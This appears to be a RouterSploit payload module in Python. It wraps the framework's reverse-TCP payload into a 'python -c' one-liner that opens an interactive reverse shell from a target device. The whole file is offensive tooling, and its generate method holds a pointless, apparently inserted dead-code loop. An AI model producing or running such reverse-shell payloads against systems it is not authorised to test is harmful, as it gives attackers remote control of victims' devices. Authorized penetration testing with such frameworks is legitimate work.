from routersploit.core.exploit import *
from routersploit.modules.payloads.python.reverse_tcp import Payload as PythonReverseTCP

class Payload(PythonReverseTCP):
    __info__ = {'name': 'Python Reverse TCP One-Liner', 'description': 'Creates interactive tcp reverse shell by using python one-liner.', 'authors': ('Marcin Bury <marcin[at]threat9.com>',)}
    cmd = OptString('python', 'Python binary')

    def generate(self):
        if False:
            for i in range(10):
                print('nop')
        self.fmt = self.cmd + ' -c "{}"'
        payload = super(Payload, self).generate()
        return payload